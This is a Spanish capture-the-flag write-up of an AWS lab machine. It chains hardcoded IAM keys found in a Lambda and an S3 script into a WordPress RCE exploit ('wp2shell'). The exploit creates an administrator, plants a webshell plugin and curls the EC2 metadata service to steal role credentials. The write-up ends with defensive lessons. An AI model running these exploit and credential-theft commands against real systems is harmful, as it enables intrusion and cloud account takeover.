# Writeup: Second (HackSmaster — Media)

**Objetivo**
Hemos sido contratados para realizar una prueba de penetración (pentest) contra la infraestructura AWS de un cliente. El cliente ha plantado una flag en AWS Secrets Manager; si logramos recuperarla, demostraremos el compromiso total de su cuenta de AWS. Para el acceso inicial, el cliente nos ha proporcionado un Access Key y un Secret Key correspondientes a un usuario con privilegios bajos. El objetivo es comprobar hasta dónde puede llevarnos ese punto de apoyo inicial.

Second es una máquina de dificultad Media basada en un entorno Cloud (AWS). El recorrido comienza con unas credenciales de IAM de bajos privilegios. Al enumerar los servicios, descubrimos permisos sobre AWS Lambda, donde encontramos unas variables de entorno con credenciales hardcodeadas. Estas nuevas credenciales nos permiten enumerar un bucket S3 que contiene un script de despliegue con un tercer par de credenciales. Con este nuevo usuario, enumeramos una instancia EC2 que aloja un WordPress vulnerable (CVE-2026-63030 y CVE-2026-60137), conocido como wp2shell. Al explotar esta vulnerabilidad y obtener Ejecución Remota de Código (RCE), accedemos al Servicio de Metadatos de la Instancia (IMDS) para robar las credenciales temporales del rol IAM asignado a la EC2. Finalmente, con estos permisos, accedemos a AWS Secrets Manager y recuperamos la flag.

---

## Fase 1: Reconocimiento Inicial y Enumeración de Lambda

Configuramos las credenciales iniciales proporcionadas por el cliente en nuestro entorno local usando AWS CLI:

```bash
┌──(kali㉿kali)-[~]
└─$ aws configure --profile second                    

Tip: You can deliver temporary credentials to the AWS CLI using your AWS Console session by running the command 'aws login'.

AWS Access Key ID [None]: AKIA[REDACTED]
AWS Secret Access Key [None]: [REDACTED]
us-east-1egion name [None]: us-east-1 
Default output format [None]: json
```

Exportamos el perfil para usarlo por defecto y verificamos nuestra identidad con `sts get-caller-identity`:

```bash
┌──(kali㉿kali)-[~]
└─$ export AWS_PROFILE=second      
                                                                                                                                                 
┌──(kali㉿kali)-[~]
└─$ aws sts get-caller-identity                       
{
    "UserId": "AIDA5Y6JLPXSWGKAFRAQQ",
    "Account": "946925698533",
    "Arn": "arn:aws:iam::946925698533:user/cg-pentest-lab"
}
```

Somos el usuario `cg-pentest-lab`. Intentamos enumerar servicios comunes como IAM y S3, pero no tenemos permisos suficientes. Sin embargo, logramos enumerar las funciones de AWS Lambda encargadas del procesamiento de logs:

```bash
┌──(kali㉿kali)-[~]
└─$ aws lambda list-functions | jq
```
```json
{
  "Functions": [
    {
      "FunctionName": "cg-log-processor-lab",
      "FunctionArn": "arn:aws:lambda:us-east-1:946925698533:function:cg-log-processor-lab",
      "Runtime": "python3.9",
      "Role": "arn:aws:iam::946925698533:role/cg-lambda-role-lab",
      "Handler": "lambda.handler",
      "CodeSize": 249,
      "Description": "",
      "Timeout": 3,
      "MemorySize": 128,
      "LastModified": "2026-07-24T17:52:50.683+0000",
      "CodeSha256": "gpAzQITfdhKnlKeb7wY78NGp0K/rTWw9u06xtnB3ZtI=",
      "Version": "$LATEST",
      "Environment": {
        "Variables": {
          "LAMBDA_MANAGER_AK": "AKIA[REDACTED]",
          "LAMBDA_MANAGER_SK": "[REDACTED]"
        }
      },
      "TracingConfig": {
        "Mode": "PassThrough"
      },
      "RevisionId": "cd4f95b3-76c2-42de-9e9e-348531f283a1",
      "PackageType": "Zip",
      "Architectures": [
        "x86_64"
      ],
      "EphemeralStorage": {
        "Size": 512
      },
      "SnapStart": {
        "ApplyOn": "None",
        "OptimizationStatus": "Off"
      },
      "LoggingConfig": {
        "LogFormat": "Text",
        "LogGroup": "/aws/lambda/cg-log-processor-lab"
      }
    }
  ]
}
```

**Hallazgo crítico:**
La función Lambda `cg-log-processor-lab` expone unas credenciales IAM hardcodeadas en sus variables de entorno:
* `LAMBDA_MANAGER_AK`: AKIA[REDACTED]
* `LAMBDA_MANAGER_SK`: [REDACTED]

---

## Fase 2: Escalada Horizontal (S3 y EC2)

Configuramos estas nuevas credenciales en nuestro entorno para suplantar la identidad del nuevo usuario:

```bash
└─$ aws configure --profile lambda-log-processor

Tip: You can deliver temporary credentials to the AWS CLI using your AWS Console session by running the command 'aws login'.

AWS Access Key ID [None]: AKIA[REDACTED]
AWS Secret Access Key [None]: [REDACTED]
Default region name [None]: us-east-1
Default output format [None]: json
                                                                                                               
┌──(kali㉿kali)-[~]
└─$ export AWS_PROFILE=lambda-log-processor     
                                                                                                               
┌──(kali㉿kali)-[~]
└─$ aws sts get-caller-identity                 
{
    "UserId": "AIDA5Y6JLPXSS6Q2B7CO5",
    "Account": "946925698533",
    "Arn": "arn:aws:iam::946925698533:user/cg-lambda-manager-lab"
}
```

Ahora somos `cg-lambda-manager-lab`. Con este usuario, reanudamos la enumeración y descubrimos acceso a un bucket S3:

```bash
┌──(kali㉿kali)-[~]
└─$ aws s3 ls                    
2026-07-24 13:52:43 cg-engineering-scripts-lab-946925698533
```

Listamos el contenido del bucket y descargamos un script de shell:

```bash
┌──(kali㉿kali)-[~]
└─$ aws s3 ls s3://cg-engineering-scripts-lab-946925698533
2026-07-24 13:52:43        316 deployment-script.sh

┌──(kali㉿kali)-[~/Projects]
└─$ aws s3 cp s3://cg-engineering-scripts-lab-946925698533/deployment-script.sh . 
download: s3://cg-engineering-scripts-lab-946925698533/deployment-script.sh to ./deployment-script.sh
                                                                                                               
┌──(kali㉿kali)-[~/Projects]
└─$ cat deployment-script.sh 
```
```bash
─────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────
     │ File: deployment-script.sh
─────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────
   1 │ #!/bin/bash
   2 │ # WordPress Deployment and Backup Automation Script
   3 │ # Authorized access only.
   4 │ 
   5 │ export AWS_ACCESS_KEY_ID="AKIA[REDACTED]"
   6 │ export AWS_SECRET_ACCESS_KEY="[REDACTED]"
   7 │ 
   8 │ echo "Starting WordPress backup job..."
   9 │ # Backup tasks go here...
  10 │ echo "Backup completed successfully."
```

El script de automatización de backups de WordPress contiene un tercer par de credenciales IAM en texto plano. Las configuramos en nuestra máquina:

```bash
┌──(kali㉿kali)-[~/Projects]
└─$ aws configure --profile wordpress-backup-job                                                               
                                                                                                               
Tip: You can deliver temporary credentials to the AWS CLI using the command 'aws login'.                                                                                                  
                                                                                                               
AWS Access Key ID [None]: AKIA[REDACTED]
AWS Secret Access Key [None]: [REDACTED]
Default region name [None]: us-east-1
Default output format [None]: json

┌──(kali㉿kali)-[~/Projects]
└─$ export AWS_PROFILE=wordpress-backup-job

┌──(kali㉿kali)-[~/Projects]
└─$ aws sts get-caller-identity
{
    "UserId": "AIDA5Y6JLPXS2PI4CS6HI",
    "Account": "946925698533",
    "Arn": "arn:aws:iam::946925698533:user/cg-wp-manager-lab"
}
```

Ahora somos `cg-wp-manager-lab`. Al tratarse de un script de WordPress, procedemos a enumerar el servicio EC2 en busca de instancias relevantes:

```bash
┌──(kali㉿kali)-[~/Projects]
└─$ aws ec2 describe-instances | jq
```
```json
{
  "Reservations": [
    {
      "ReservationId": "r-0594035e3903fc006",
      "OwnerId": "946925698533",
      "Groups": [],
      "Instances": [
        {
          "Architecture": "x86_64",
          "IamInstanceProfile": {
            "Arn": "arn:aws:iam::946925698533:instance-profile/cg-ec2-instance-profile-lab",
            "Id": "AIPA5Y6JLPXSS37LTXWIL"
          },
          "NetworkInterfaces": [
            {
              "Association": {
                "IpOwnerId": "amazon",
                "PublicDnsName": "ec2-100-58-158-10.compute-1.amazonaws.com",
                "PublicIp": "100.58.158.10"
              }
            }
          ],
          "Tags": [
            {
              "Key": "Name",
              "Value": "cg-marketing-wp-lab"
            }
          ],
          "InstanceId": "i-08509ab51bd83daf9",
          "ImageId": "ami-0d001f8052688dc45",
          "State": {
            "Code": 16,
            "Name": "running"
          },
          "PublicDnsName": "ec2-100-58-158-10.compute-1.amazonaws.com",
          "PrivateIpAddress": "10.10.10.187",
          "PublicIpAddress": "100.58.158.10"
        }
      ]
    }
  ]
}
```

Hemos descubierto una instancia EC2 (`i-08509ab51bd83daf9`) corriendo con la IP pública `100.58.158.10` y un perfil de instancia IAM asignado (`cg-ec2-instance-profile-lab`).

---

## Fase 3: Reconocimiento Web y la vulnerabilidad wp2shell

Realizamos un escaneo con Nmap sobre la IP pública de la instancia EC2 para identificar servicios expuestos:

```bash
┌──(kali㉿kali)-[~/Projects]
└─$ nmap -sV -sC -p- 100.58.158.10                         
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-24 14:37 -0400
Nmap scan report for ec2-100-58-158-10.compute-1.amazonaws.com (100.58.158.10)
Host is up (0.078s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 1b:08:b3:9c:08:b0:63:ba:f9:cd:da:14:19:e6:9c:7a (ECDSA)
|_  256 6d:16:5b:8e:71:56:fc:12:7b:22:1a:f7:55:1b:de:1d (ED25519)
80/tcp open  http    Apache httpd 2.4.66 ((Debian))
| http-robots.txt: 1 disallowed entry 
|_/wp-admin/
|_http-generator: WordPress 6.9
|_http-title: CG Marketing Portal
|_http-server-header: Apache/2.4.66 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Encontramos un servicio HTTP en el puerto 80 que ejecuta un WordPress versión 6.9. Al investigar esta versión, descubrimos que es vulnerable a un ataque crítico conocido como **wp2shell**, compuesto por las vulnerabilidades **CVE-2026-63030** y **CVE-2026-60137**.

**¿Qué es wp2shell?**
Es un encadenamiento de vulnerabilidades que permite la Ejecución Remota de Código (RCE) sin autenticación previa en WordPress 6.9 y 7.0:

1. **CVE-2026-63030 (Confusión de Rutas):** Un error de lógica en el procesador por lotes de la API REST (`/wp-json/batch/v1`). El sistema procesa la validación y la ejecución en bucles independientes. Si una solicitud interna falla de forma específica, se desincronizan los historiales de validación y ejecución, permitiendo que solicitudes maliciosas evadan los filtros de seguridad.
2. **CVE-2026-60137 (Inyección SQL):** Al evadir los filtros de la API REST, el atacante puede explotar un SQLi en el parámetro `author__not_in`.
3. **De SQLi a RCE:** Con acceso a la base de datos, el atacante altera opciones globales de WordPress para simular permisos de Administrador, creando una cuenta o instalando un plugin malicioso (webshell) que le da control total del servidor.

Verificamos que la API REST es accesible:

```bash
└─$ curl http://ec2-100-58-158-10.compute-1.amazonaws.com/wp-json/batch/v1
{"code":"rest_no_route","message":"No route was found matching the URL and request method.","data":{"status":404}}
```

Descargamos una prueba de concepto (PoC) para explotar esta vulnerabilidad de forma cómoda:

```bash
┌──(kali㉿kali)-[~/Projects]
└─$ git clone https://github.com/Icex0/wp2shell-poc.git                     
Cloning into 'wp2shell-poc'...
...
┌──(kali㉿kali)-[~/Projects]
└─$ cd wp2shell-poc                                                       
```

Ejecutamos el script en modo `check` para confirmar la vulnerabilidad:

```bash
┌──(kali㉿kali)-[~/Projects/wp2shell-poc]
└─$ ./wp2shell.py check http://ec2-100-58-158-10.compute-1.amazonaws.com 
[*] WordPress markers found (wp-content / wp-includes / wp-json)
[*] Public WordPress version hints:
    - 6.9 via HTML generator meta (wp2shell affected range) - WordPress 6.9
[!] A public version hint falls in the wp2shell affected range; verify internally or confirm with authorization.
[*] Batch probe -> HTTP 207; markers matched: parse_path_failed, block_cannot_read, rest_batch_not_allowed
[+] VULNERABLE — batch route-confusion behavior detected.
[*] SQLi confirmation not sent; use --confirm-sqli for the active SQLi probe.
```

El sistema es vulnerable. Probamos la ejecución de comandos remotos usando el parámetro `--cmd id`:

```bash
└─$ ./wp2shell.py shell http://ec2-100-58-158-10.compute-1.amazonaws.com --cmd id 
[!] This uploads a plugin containing a webshell to the target.
[!] No credentials supplied; attempting pre-auth administrator creation.
[*] Creating administrator through the SQLi-to-customizer bridge...
[+] Administrator created: wp2_652f8adebd87
[+]     email:    wp2_652f8adebd87@wp2shell.invalid
[+]     password: Wp2!hWwl-LuXxSfO7GKTNIT0
[*] Authenticating as 'wp2_652f8adebd87'...
[+] Authenticated.
[*] Deploying webshell plugin...
[+] Webshell: http://ec2-100-58-158-10.compute-1.amazonaws.com/wp-content/plugins/wp2shell_560c155a/wp2shell_560c155a.php

uid=33(www-data) gid=33(www-data) groups=33(www-data)

[*] Deleting generated administrator...
[+] Generated administrator removed from the target.
[*] Cleaning up webshell...
[+] Webshell removed from the target.
```

¡Tenemos RCE como `www-data`!

---

## Fase 4: Abuso del Servicio de Metadatos (IMDS)

Dado que estamos dentro de una instancia EC2 de AWS, el siguiente paso es abusar del **Instance Metadata Service (IMDS)**. El IMDS es un servicio que permite a las instancias EC2 consultar información sobre sí mismas, incluyendo las credenciales temporales del rol IAM que tienen asignado. 

Primero, descubrimos el nombre del rol IAM consultando la ruta de seguridad del IMDS:

```bash
┌──(kali㉿kali)-[~/Projects/wp2shell-poc]
└─$ ./wp2shell.py shell http://ec2-100-58-158-10.compute-1.amazonaws.com --cmd 'curl http://169.254.169.254/latest/meta-data/iam/security-credentials/'                                                                                                                       
[!] This uploads a plugin containing a webshell to the target.                                                                         
[!] No credentials supplied; attempting pre-auth administrator creation.                                                               
[*] Creating administrator through the SQLi-to-customizer bridge...                                                                    
[+] Administrator created: wp2_07338e1e5e3e                                                                                            
...
[+] Webshell: http://ec2-100-58-158-10.compute-1.amazonaws.com/wp-content/plugins/wp2_64e41966/wp2_64e41966.php              
                                                                                                                                       
cg-ec2-role-lab                                                                                                                       
                                                                                                                                       
[*] Deleting generated administrator...                                                                                                
[+] Generated administrator removed from the target.                                                                                   
[*] Cleaning up webshell...                                                                                                            
[+] Webshell removed from the target.
```

El rol asignado a la instancia es `cg-ec2-role-lab`. Ahora solicitamos las credenciales temporales (Access Key, Secret Key y Session Token) para este rol:

```bash
└─$ ./wp2shell.py shell http://ec2-100-58-158-10.compute-1.amazonaws.com --cmd 'curl http://169.254.169.254/latest/meta-data/iam/security-credentials/cg-ec2-role-lab'
[!] This uploads a plugin containing a webshell to the target.
[!] No credentials supplied; attempting pre-auth administrator creation.
[*] Creating administrator through the SQLi-to-customizer bridge...
[+] Administrator created: wp2_d1450ba97029
...
[+] Webshell: http://ec2-100-58-158-10.compute-1.amazonaws.com/wp-content/plugins/wp2_8a622e5a/wp2_8a622e5a.php

{
  "Code" : "Success",
  "LastUpdated" : "2026-07-24T19:29:27Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "ASIA[REDACTED]",
  "SecretAccessKey" : "[REDACTED]",
  "Token" : "[REDACTED_SESSION_TOKEN]",
  "Expiration" : "2026-07-25T01:43:39Z"
}

[*] Deleting generated administrator...
[+] Generated administrator removed from the target.
[*] Cleaning up webshell...
[+] Webshell removed from the target.
```

---

## Fase 5: Compromiso Total y Captura de la Flag

Con las credenciales temporales del rol `cg-ec2-role-lab` extraídas, las configuramos en nuestra máquina AWS CLI. Es vital incluir el Session Token, ya que son credenciales temporales asumidas vía STS:

```bash
┌──(kali㉿kali)-[~/Projects/wp2shell-poc]
└─$ aws configure --profile ec2role             
AWS Access Key ID [None]: ASIA[REDACTED]
AWS Secret Access Key [None]: [REDACTED]
AWS Session Token [None]: [REDACTED_SESSION_TOKEN]
Default region name [us-east-1]: us-east-1
Default output format [json]: json

┌──(kali㉿kali)-[~/Projects/wp2shell-poc]
└─$ export AWS_PROFILE=ec2role             
                                                                                                                                                 
┌──(kali㉿kali)-[~/Projects/wp2shell-poc]
└─$ aws sts get-caller-identity    
{
    "UserId": "AROA5Y6JLPXS5HNUB3GWW:i-08509ab51bd83daf9",
    "Account": "946925698533",
    "Arn": "arn:aws:sts::946925698533:assumed-role/cg-ec2-role-lab/i-08509ab51bd83daf9"
}
```

Nuestra identidad ahora es el rol de la instancia EC2. Enumeramos el servicio Secrets Manager en busca de la flag objetivo:

```bash
┌──(kali㉿kali)-[~/Projects/wp2shell-poc]
└─$ aws secretsmanager list-secrets
{
    "SecretList": [
        {
            "ARN": "arn:aws:secretsmanager:us-east-1:946925698533:secret:cg-final-flag-lab-DlI1RS",
            "Name": "cg-final-flag-lab",
            "Description": "CloudGoat Final Flag",
            "LastChangedDate": "2026-07-24T13:52:42.160000-04:00",
            "LastAccessedDate": "2026-07-23T20:00:00-04:00",
            "SecretVersionsToStages": {
                "terraform-LqtAKDLBxVuP7JEzxnQB2YXTqc": [
                    "AWSCURRENT"
                ]
            },
            "CreatedDate": "2026-07-24T13:52:41.912000-04:00"
        }
    ]
}
```

Encontramos el secreto `cg-final-flag-lab`. Procedemos a leer su valor:

```bash
┌──(kali㉿kali)-[~/Projects/wp2shell-poc]
└─$ aws secretsmanager get-secret-value --secret-id cg-final-flag-lab
{
    "ARN": "arn:aws:secretsmanager:us-east-1:946925698533:secret:cg-final-flag-lab-DlI1RS",
    "Name": "cg-final-flag-lab",
    "VersionId": "terraform-LqtAKDLBxVuP7JEzxnQB2YXTqc",
    "SecretString": "HSM{369817da90b44eb9aacc1ccf592d3fd1}",
    "VersionStages": [
        "AWSCURRENT"
    ],
    "CreatedDate": "2026-07-24T13:52:42.117000-04:00"
}
```

¡Hemos recuperado la flag final! El compromiso total de la cuenta de AWS ha sido demostrado con éxito: `HSM{369817da90b44eb9aacc1ccf592d3fd1}`.

---

## Conclusión

Second es una máquina excelente que demuestra una cadena de kill-chain realista en un entorno Cloud (AWS):
1. Enumeración inicial sobre AWS Lambda que reveló credenciales IAM hardcodeadas en variables de entorno.
2. Escalada horizontal descubriendo un bucket S3 con un script de despliegue que contenía un tercer par de credenciales.
3. Uso de credenciales de "WordPress Manager" para enumerar instancias EC2 y encontrar un servidor web expuesto.
4. Explotación de vulnerabilidades críticas encadenadas (wp2shell / CVE-2026-63030 & CVE-2026-60137) para obtener RCE sin autenticación.
5. Abuso del Instance Metadata Service (IMDS) desde la webshell para robar las credenciales temporales del rol IAM de la EC2.
6. Uso del rol comprometido para acceder a AWS Secrets Manager y extraer la flag final.

## Lecciones aprendidas
* **Nunca hardcodear credenciales en código o configuraciones:** Guardar claves de acceso en scripts `.sh` o en variables de entorno de funciones Lambda permite a un atacante pivotar fácilmente entre servicios y usuarios. Se deben utilizar roles IAM y AWS Systems Manager Parameter Store o Secrets Manager.
* **Mantener los CMS actualizados:** La vulnerabilidad wp2shell en WordPress 6.9 es crítica (CVSS 9.8) y permite toma de control total sin credenciales. Aplicar parches de seguridad de forma proactiva es indispensable.
* **Restringir el acceso al IMDS (Instance Metadata Service):** Las instancias EC2 que ejecutan aplicaciones web vulnerables a RCE (como SSRF o inyecciones) exponen sus credenciales IAM temporales a través del IMDS. Se recomienda habilitar IMDSv2, que requiere tokenización, y aplicar firewalls a nivel de aplicación para bloquear solicitudes a `169.254.169.254`.
* **Aplicar el principio de mínimo privilegio en Roles IAM:** El rol asignado a la instancia EC2 (`cg-ec2-role-lab`) tenía permisos para leer secretos críticos en AWS Secrets Manager. Los roles de servicio (como los de EC2) no deben tener permisos de lectura sobre secretos globales a menos que sea estrictamente necesario para su función inmediata.
